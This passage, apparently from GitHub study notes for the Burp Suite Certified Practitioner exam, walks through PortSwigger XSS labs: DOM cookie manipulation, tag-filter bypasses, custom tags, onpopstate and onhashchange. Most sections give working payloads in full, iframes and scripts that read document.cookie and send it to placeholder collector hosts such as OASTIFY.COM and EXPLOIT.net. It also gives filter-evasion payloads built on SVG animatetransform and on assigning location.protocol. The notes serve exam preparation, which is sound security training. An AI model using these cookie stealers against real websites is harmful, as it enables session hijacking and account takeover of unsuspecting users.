<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/reflected-dom-xss-json-cookie-stealer.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/reflected-dom-xss-json-cookie-stealer.png" alt="Reflected DOM-XSS JSON cookie stealer" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">In the image above, I create insecure POC cookie value in my browser before simulating a victim user clicking on <code>http://localhost/index.html</code> link, same as Burp Exploit server, that is the same as the Deliver exploit to victim function.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected" rel="nofollow">PortSwigger Lab: Reflected DOM XSS</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">DOM-XSS LastviewedProduct Cookie</h3><a id="user-content-dom-xss-lastviewedproduct-cookie" class="anchor" aria-label="Permalink: DOM-XSS LastviewedProduct Cookie" href="#dom-xss-lastviewedproduct-cookie"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the cookie <code>lastViewedProduct</code> is set to the last URL visited under the product page.<br>
In the <code>source code</code> we identify the injection script tags where <code>window.location</code> is set.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-xss-lastViewedProduct-cookie.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-xss-lastViewedProduct-cookie.png" alt="DOM-XSS lastViewedProduct cookie code" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Testing the escape out of of the script string for the value of <strong>document.location</strong> using <code>/product?productId=1&amp;'&gt;fuzzer</code>.<br>
Note that <strong>document.location</strong> value cannot be URL encoded.</p>
</blockquote>
<blockquote>
<p dir="auto">On exploit server add the following iframe to the body:</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/product?productId=1&amp;'&gt;&lt;script&gt;fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)&lt;/script&gt;&quot; onload=&quot;if(!window.x)this.src='https://TARGET.net';window.x=1;&quot;&gt;
&lt;/iframe&gt;
"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/product?productId=1&amp;'&gt;&lt;script&gt;fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)&lt;/script&gt;</span>" <span class="pl-c1">onload</span>="<span class="pl-s">if(!window.x)this.src='https://TARGET.net';window.x=1;</span>"<span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">iframe</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/DOM_based_cookie_manipulation.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/DOM_based_cookie_manipulation.png" alt="DOM_based_cookie_manipulation.png" style="max-width: 100%;"></a></p>
<p dir="auto">Once the victim cookie is updated the Exploit server log captures their secret cookie value.</p>
<blockquote>
<p dir="auto">With the great help from <em><strong>ShehmeerAbidRajput</strong></em> I updated this lab with his provided cookie stealer payload.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation" rel="nofollow">PortSwigger Lab: DOM-based cookie manipulation</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Cross Site Scripting</h2><a id="user-content-cross-site-scripting" class="anchor" aria-label="Permalink: Cross Site Scripting" href="#cross-site-scripting"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#xss-resources">XSS Resources</a><br>
<a href="#identify-allowed-tags">Identify allowed Tags</a><br>
<a href="#bypass-blocked-tags">Bypass Blocked Tags</a><br>
<a href="#xss-assign-protocol">XSS Assign protocol</a><br>
<a href="#custom-tags-not-blocked">Custom Tags not Blocked</a><br>
<a href="#onhashchange">OnHashChange</a><br>
<a href="#reflected-string-xss">Reflected String XSS</a><br>
<a href="#reflected-string-extra-escape">Reflected String Extra Escape</a><br>
<a href="#angularjs-sandbox-escape">AngularJS Sandbox Escape</a><br>
<a href="#xss-template-literal">XSS Template Literal</a><br>
<a href="#xss-via-json-into-eval">XSS via JSON into EVAL</a><br>
<a href="#stored-xss">Stored XSS</a><br>
<a href="#stored-dom-xss">Stored DOM XSS</a><br>
<a href="#xss-svg-upload">XSS in SVG Upload</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XSS Resources</h3><a id="user-content-xss-resources" class="anchor" aria-label="Permalink: XSS Resources" href="#xss-resources"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">XSS Resources pages to lookup payloads for <strong>tags</strong> and <strong>events</strong>.</p>
</blockquote>
<ul dir="auto">
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" rel="nofollow">Cross-site scripting (XSS) cheat sheet</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications">PayloadsAllTheThings (XSS)</a></li>
<li><a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/Cross-site-scripting-xss.md">HackTheBox CPTS Study notes on XSS</a></li>
</ul>
<blockquote>
<p dir="auto">CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks. Example is if the <code>base-uri</code> is missing, this vulnerability will allow attacker to use the alternative exploit method described at <a href="#upgrade-stored-self-xss">Upgrade stored self-XSS</a>.</p>
</blockquote>
<ul dir="auto">
<li><a href="https://csp-evaluator.withgoogle.com/" rel="nofollow">CSP Evaluator</a></li>
</ul>
<blockquote>
<p dir="auto">When input field maximum length is at only 23 character in length then use this resource for <strong>Tiny XSS Payloads</strong>.</p>
</blockquote>
<ul dir="auto">
<li><a href="https://github.com/terjanq/Tiny-XSS-Payloads">Tiny XSS Payloads</a></li>
</ul>
<blockquote>
<p dir="auto">Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md">cookie stealer payloads</a>.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="document.cookie = &quot;TopSecret=UnsecureCookieValue4Peanut2019&quot;;"><pre><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span> <span class="pl-c1">=</span> <span class="pl-s">"TopSecret=UnsecureCookieValue4Peanut2019"</span><span class="pl-kos">;</span></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Identify allowed Tags</h3><a id="user-content-identify-allowed-tags" class="anchor" aria-label="Permalink: Identify allowed Tags" href="#identify-allowed-tags"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Basic XSS Payloads to <em><strong>identify</strong></em> application security filter controls for handling data received in HTTP request.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;img src=1 onerror=alert(1)&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>=<span class="pl-s">1</span> <span class="pl-c1">onerror</span>=<span class="pl-s">alert(1)</span><span class="pl-kos">&gt;</span></pre></div>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;&gt;&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;"><pre>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">svg</span><span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">animatetransform</span> <span class="pl-c1">onbegin</span>=<span class="pl-s">alert(1)</span><span class="pl-kos">&gt;</span></pre></div>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;&gt;\'\&quot;&lt;script&gt;{{7*7}}$(alert(1)}&quot;-prompt(69)-&quot;fuzzer"><pre class="notranslate"><code>&lt;&gt;\'\"&lt;script&gt;{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
</code></pre></div>
<blockquote>
<p dir="auto">Submitting the above payloads may give response message, <em><strong>"Tag is not allowed"</strong></em> due to Web Application Firewall (WAF) blocking injections.
Then <em><strong>identify</strong></em> allowed tags using <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked" rel="nofollow">PortSwigger Academy Methodology</a>.</p>
</blockquote>
<blockquote>
<p dir="auto">URL and Base64 online encoders and decoders</p>
</blockquote>
<ul dir="auto">
<li><a href="https://www.urldecoder.org/" rel="nofollow">URL Decode and Encode</a></li>
<li><a href="https://www.base64encode.org/" rel="nofollow">BASE64 Decode and Encode</a></li>
</ul>
<blockquote>
<p dir="auto">This lab gives great <strong>Methodology</strong> to <em><strong>identify</strong></em> allowed HTML tags and events for crafting POC XSS.</p>
</blockquote>
<blockquote>
<p dir="auto">Host <strong>iframe</strong> code on exploit server and deliver exploit link to victim.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E&quot;&gt;  "><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E</span>"<span class="pl-kos">&gt;</span>  </pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked" rel="nofollow">PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p>
<blockquote>
<p dir="auto">In below sample the tag <strong>Body</strong> and event <strong>onresize</strong> is the only allowed, providing an injection to perform XSS.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width='100px'&gt;"><pre>?<span class="pl-s1">search</span><span class="pl-c1">=</span><span class="pl-c1">%</span><span class="pl-c1">22</span><span class="pl-c1">%</span><span class="pl-c1">3</span><span class="pl-v">E</span><span class="pl-c1">%</span><span class="pl-c1">3</span><span class="pl-v">Cbody</span><span class="pl-c1">%</span><span class="pl-c1">20</span><span class="pl-s1">onresize</span><span class="pl-c1">=</span><span class="pl-en">print</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-c1">%</span><span class="pl-c1">3</span><span class="pl-v">E</span>" onload=this.style.width='100px'&gt;</pre></div>
<blockquote>
<p dir="auto">This example show the <strong>Body</strong> and event <strong>onpopstate</strong> is not blocked.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="?search=%22%3E%3Cbody%20onpopstate=print()&gt;"><pre>?<span class="pl-s1">search</span><span class="pl-c1">=</span><span class="pl-c1">%</span><span class="pl-c1">22</span><span class="pl-c1">%</span><span class="pl-c1">3</span><span class="pl-v">E</span><span class="pl-c1">%</span><span class="pl-c1">3</span><span class="pl-v">Cbody</span><span class="pl-c1">%</span><span class="pl-c1">20</span><span class="pl-s1">onpopstate</span><span class="pl-c1">=</span><span class="pl-en">print</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-c1">&gt;</span></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate" rel="nofollow">PortSwigger Cheat-sheet XSS Example: onpopstate event</a></p>
<blockquote>
<p dir="auto">Below JavaScript is hosted on exploit server and then deliver to victim.<br>
The <code>code</code> is an iframe doing <strong>onload</strong> and the search parameter is vulnerable to <strong>onpopstate</strong>.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe onload=&quot;if(!window.flag){this.contentWindow.location='https://TARGET.net?search=&lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie&gt;#';flag=1}&quot; src=&quot;https://TARGET.net?search=&lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie&gt;&quot;&gt;&lt;/iframe&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">iframe</span> <span class="pl-c1">onload</span><span class="pl-c1">=</span><span class="pl-s">"if(!window.flag){this.contentWindow.location='https://TARGET.net?search=&lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie&gt;#';flag=1}"</span> <span class="pl-c1">src</span><span class="pl-c1">=</span><span class="pl-s">"https://TARGET.net?search=&lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie&gt;"</span><span class="pl-c1">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-s1">iframe</span><span class="pl-c1">&gt;</span></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Bypass Blocked Tags</h3><a id="user-content-bypass-blocked-tags" class="anchor" aria-label="Permalink: Bypass Blocked Tags" href="#bypass-blocked-tags"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Application controls give message, <em><strong>"Tag is not allowed"</strong></em> when inserting basic XSS payloads, but discover SVG mark-up allowed using above <a href="#identify-allowed-tags">methodology</a>. This payload steal my own session cookie as POC.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E"><pre>https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E</pre></div>
<blockquote>
<p dir="auto">Place the above payload on exploit server and insert URL with search value into an <code>iframe</code> before delivering to victim in below code block.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E&quot;&gt;
&lt;/iframe&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">src</span>="<span class="pl-s">https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E</span>"<span class="pl-kos">&gt;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">iframe</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/svg-animatetransform-xss.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/svg-animatetransform-xss.png" alt="svg animatetransform XSS" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed" rel="nofollow">PortSwigger Lab: Reflected XSS with some SVG markup allowed</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">XSS Assign protocol</h3><a id="user-content-xss-assign-protocol" class="anchor" aria-label="Permalink: XSS Assign protocol" href="#xss-assign-protocol"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the <strong>Assignable protocol with location</strong> <code>javascript</code> exploit <em><strong>identified</strong></em> by <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location" rel="nofollow">PortSwigger XSS research</a>. In the payload is the <code>%0a</code> representing the ASCII newline character.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;location.protocol='javascript';&lt;/script&gt;#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//&amp;context=html"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-s1">location</span><span class="pl-kos">.</span><span class="pl-c1">protocol</span><span class="pl-c1">=</span><span class="pl-s">'javascript'</span><span class="pl-kos">;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//&amp;context=html</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss-protocol-location.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss-protocol-location.png" alt="XSS protocol location" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" rel="nofollow">PortSwigger Lab: Reflected XSS into HTML context with nothing encoded</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Custom Tags not Blocked</h3><a id="user-content-custom-tags-not-blocked" class="anchor" aria-label="Permalink: Custom Tags not Blocked" href="#custom-tags-not-blocked"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Application respond with message <em><strong>"Tag is not allowed"</strong></em> when attempting to insert XSS payloads, but if we create a custom tag it is bypassed.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;xss+id=x&gt;#x';"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">xss</span><span class="pl-c1">+id</span>=<span class="pl-s">x</span><span class="pl-kos">&gt;</span>#x';</pre></div>
<p dir="auto"><em><strong>Identify</strong></em> if above custom tag is not block in search function, by observing the response. Create below payload to steal session cookie out-of-band.</p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;script&gt;
location = 'https://TARGET.net/?search=&lt;xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1&gt;#x';
&lt;/script&gt;"><pre class="notranslate"><code>&lt;script&gt;
location = 'https://TARGET.net/?search=&lt;xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1&gt;#x';
&lt;/script&gt;
</code></pre></div>
<blockquote>
<p dir="auto"><strong>Note:</strong> The custom tag with the ID <code>x</code>, which contains an <strong>onfocus</strong> event handler that triggers the <code>document.location</code> function. The <strong>HASH</strong> <code>#</code> character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in <code>script</code> tags, and send to victim. Below is the same payload but <strong>URL-encoded</strong> format.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;script&gt;
location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
&lt;/script&gt;"><pre class="notranslate"><code>&lt;script&gt;
location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
&lt;/script&gt;
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/custom-xss-tag.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/custom-xss-tag.png" alt="Custom XSS tag" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked" rel="nofollow">PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones</a></p>
<p dir="auto"><a href="https://youtu.be/sjs6RS7lURk" rel="nofollow">z3nsh3ll - explaining custom tags for XSS attacks</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">OnHashChange</h3><a id="user-content-onhashchange" class="anchor" aria-label="Permalink: OnHashChange" href="#onhashchange"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Below iframe uses <strong>HASH</strong> <code>#</code> character at end of the URL to trigger the <strong>OnHashChange</strong> XSS cookie stealer.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe src=&quot;https://TARGET.net/#&quot; onload=&quot;document.location='http://OASTIFY.COM/?cookies='+document.cookie&quot;&gt;&lt;/iframe&gt;"><pre><span class="pl-c1">&lt;</span><span class="pl-s1">iframe</span> <span class="pl-c1">src</span><span class="pl-c1">=</span><span class="pl-s">"https://TARGET.net/#"</span> <span class="pl-c1">onload</span><span class="pl-c1">=</span><span class="pl-s">"document.location='http://OASTIFY.COM/?cookies='+document.cookie"</span><span class="pl-c1">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-s1">iframe</span><span class="pl-c1">&gt;</span></pre></div>
<blockquote>
<p dir="auto">Note if the cookie is secure with <strong>HttpOnly</strong> flag set enabled, the cookie cannot be stolen using XSS.</p>
</blockquote>
<blockquote>
<p dir="auto">PortSwigger Lab payload perform print.</p>
</blockquote>
